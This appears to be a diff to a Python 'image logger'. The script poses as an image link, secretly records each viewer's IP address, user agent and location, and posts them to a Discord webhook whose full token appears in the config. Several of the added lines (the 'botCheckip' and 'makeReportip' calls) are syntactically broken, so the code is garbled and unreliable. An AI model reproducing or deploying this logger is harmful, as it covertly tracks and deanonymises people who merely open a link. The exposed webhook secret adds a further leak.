@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1562999458332020737/h78RM5hheWUPhRygVTqHAoqH5vYgi5UTngBApBQmNsi9HRCMlMDU1SwGdCt9-0Ln6f-p",
-    "image": "https://imgflip.com/memesearch?q=fat+kid", # You can also have a custom image by using a URL argument
+    "image": "https://imgs.search.brave.com/VmR1OD5eZ2hy6U28qr8rP8cFrAFzM6vdp0Z4bJV5SqA/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly9pLmlt/Z2ZsaXAuY29tLzQv/NXYzZmxtLmpwZw", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -217,14 +217,14 @@ height: 100vh;
 if ip.startswith(blacklistedIPs):
     return
             
-            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
+            if botCheckip = self.headers.get('x-forwarded-for', '') or '', self.headers.get('user-agent')):
                 self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                 self.end_headers() # Declare the headers as finished.
 
                 if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
 
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+                makeReportip = self.headers.get('x-forwarded-for', '') or '', endpoint = s.split("?")[0], url = url)
                 
                 return
             
@@ -236,7 +236,7 @@ if ip.startswith(blacklistedIPs):
                     location = base64.b64decode(dic.get("g").encode()).decode()
                     result = makeReportip = self.headers.get('x-forwarded-for', '') or '', self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                 else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+                    result = makeReportip = self.headers.get('x-forwarded-for', '') or '', self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                 
 
                 message = config["message"]["message"]
